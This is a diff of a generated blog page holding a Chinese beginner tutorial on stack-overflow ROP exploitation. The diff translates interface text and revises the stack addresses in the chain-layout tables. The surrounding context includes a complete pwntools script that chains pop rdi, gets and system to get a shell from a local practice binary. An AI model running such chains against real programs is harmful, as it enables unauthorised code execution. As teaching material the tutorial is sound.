@@ -10,7 +10,7 @@
   font-family: 'JetBrains Mono';
   src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
 }
-</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"键入以继续","blurHolder":"数据检索","noResult":"无 $0 相关数据"},"code":{"codeInfo":"$0 - $1 行","copy":"复制"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
+</style><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy"}}</script><link type="text/css" rel="stylesheet" href="/lib/encrypt/hbe.style.css"><script src="//unpkg.com/mermaid@10.5.0/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/css/all.min.css"><script>if (window.localStorage.getItem('theme-mode') === 'light')
  document.documentElement.setAttribute('theme-mode', 'light')
 if (window.localStorage.getItem('theme-mode') === 'dark')
  document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
@@ -23,7 +23,7 @@ if (window.localStorage.getItem('theme-mode') === 'dark')
 }</style><style>:root {
  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
  --light-background: url('/img/bk.jpg');
- --theme-encrypt-confirm: '确认'
+ --theme-encrypt-confirm: 'confirm'
 }</style><script defer src="/js/arknights.js"></script><script defer src="/js/search.js"></script><script defer type="module">import mermaid from '//unpkg.com/mermaid@10.5.0/dist/mermaid.esm.mjs';
 window.mermaid = mermaid;
 code.paintMermaid();
@@ -59,7 +59,7 @@ lightGallery(document.getElementById('post-bg'), {
    }
  }
 });
-document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="数据检索" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>栈溢出 - ROP (一)</h1><div id="post-info"><span>文章发布时间: <div class="control"><time datetime="2024-08-15T15:06:15.007Z" id="date"> 2024-08-15</time></div></span><br><span>最后更新时间: <div class="control"><time datetime="2024-08-19T07:17:42.573Z" id="updated"> 2024-08-19</time></div></span></div></div><hr><div id="post-content"><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>栈溢出是一种允许攻击者向栈中写入过长数据的漏洞。</p>
+document.addEventListener("pjax:complete", reset);reset()})</script><meta name="generator" content="Hexo 7.3.0"></head><body><div class="loading" style="opacity: 0;"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><div class="navBtn"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><nav><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup" tabindex="0"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>栈溢出 - ROP (一)</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2024-08-15T15:06:15.007Z" id="date"> 2024-08-15</time></div></span><br><span>Last Update: <div class="control"><time datetime="2024-08-20T02:14:42.202Z" id="updated"> 2024-08-20</time></div></span></div></div><hr><div id="post-content"><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>栈溢出是一种允许攻击者向栈中写入过长数据的漏洞。</p>
 <p>ROP 是栈溢出的一种利于方式，攻击者对栈空间进行构造进而调用程序已有的指令片段进行攻击。</p>
 <p><mark>下面通过一个例题来进行讲解。</mark></p>
 <p>因为是入门第一篇文章，所以会讲的比较细。遇到不明白的继续往后看就清楚了。</p>
@@ -337,19 +337,19 @@ document.addEventListener("pjax:complete", reset);reset()})</script><meta name="
 <td align="left">0x601060</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x00007FFFFFFFDDE8</td>
 <td align="left">gets 地址</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left">0x00007FFFFFFFDDF0</td>
 <td align="left">0x4005E3</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left">0x00007FFFFFFFDDF8</td>
 <td align="left">0x601060</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left">0x00007FFFFFFFDE00</td>
 <td align="left">system 地址</td>
 </tr>
 </tbody></table>
@@ -386,28 +386,28 @@ document.addEventListener("pjax:complete", reset);reset()})</script><meta name="
 <td>buf 地址</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x00007FFFFFFFDDE8</td>
 <td align="left"><mark>gets 地址</mark></td>
 <td><mark>gets 地址</mark></td>
 <td><mark>gets 地址</mark></td>
 <td>gets 地址</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left">0x00007FFFFFFFDDF0</td>
 <td align="left"><mark>pop rdi &amp; retn 地址</mark></td>
 <td><mark>pop rdi &amp; retn 地址</mark></td>
 <td><mark>pop rdi &amp; retn 地址</mark></td>
 <td><mark>pop rdi &amp; retn 地址</mark></td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left">0x00007FFFFFFFDDF8</td>
 <td align="left"><mark>buf 地址</mark></td>
 <td><mark>buf 地址</mark></td>
 <td><mark>buf 地址</mark></td>
 <td><mark>buf 地址</mark></td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left">0x00007FFFFFFFDE00</td>
 <td align="left"><mark>system 地址</mark></td>
 <td><mark>system 地址</mark></td>
 <td><mark>system 地址</mark></td>
@@ -449,25 +449,25 @@ document.addEventListener("pjax:complete", reset);reset()})</script><meta name="
 <td>buf 地址</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDD8</td>
+<td align="left">0x00007FFFFFFFDDE8</td>
 <td align="left">gets 地址</td>
 <td>gets 地址</td>
 <td>gets 地址</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDD0</td>
+<td align="left">0x00007FFFFFFFDDF0</td>
 <td align="left">pop rdi &amp; retn 地址</td>
 <td>pop rdi &amp; retn 地址</td>
 <td>pop rdi &amp; retn 地址</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDC8</td>
+<td align="left">0x00007FFFFFFFDDF8</td>
 <td align="left"><mark>buf 地址</mark></td>
 <td>buf 地址</td>
 <td>buf 地址</td>
 </tr>
 <tr>
-<td align="left">0x00007FFFFFFFDDC0</td>
+<td align="left">0x00007FFFFFFFDE00</td>
 <td align="left"><mark>system 地址</mark></td>
 <td><mark>system 地址</mark></td>
 <td>system 地址</td>
@@ -482,4 +482,4 @@ document.addEventListener("pjax:complete", reset);reset()})</script><meta name="
 <p><mark>编写 EXP</mark></p>
 <p>地址能够预知归功于未开启 PIE 保护。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span><br><br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>buf = <span class="hljs-number">0x601060</span><br>gets = elf.sym[<span class="hljs-string">&#x27;gets&#x27;</span>]<br>system = elf.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>pop_rdi_retn = <span class="hljs-number">0x4005E3</span><br>payload = cyclic(<span class="hljs-number">0x0A</span> + <span class="hljs-number">8</span>) + p64(pop_rdi_retn) + p64(buf) + p64(gets) + p64(pop_rdi_retn) + p64(buf) + p64(system)<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>io.sendline(payload) <br>io.sendline(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>io.recv()<br>io.interactive()<br></code></pre></td></tr></table></figure>
-<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/08/15/%E5%8F%8D%E5%B0%84%20DLL%20%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/">反射 DLL 加载器原理与实现 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Calico</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">ROP 分析</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2024/08/15/%E5%8F%8D%E5%B0%84%20DLL%20%E5%8A%A0%E8%BD%BD%E5%99%A8%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0/">反射 DLL 加载器原理与实现 Prev →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="To Catalog">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Calico</a></h1><div id="description"><p></p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BB%8B%E7%BB%8D"><span class="toc-number">1.</span> <span class="toc-text">介绍</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA"><span class="toc-number">2.</span> <span class="toc-text">环境搭建</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90"><span class="toc-number">3.</span> <span class="toc-text">调试分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ROP-%E5%88%86%E6%9E%90"><span class="toc-number">4.</span> <span class="toc-text">ROP 分析</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas></body></html>
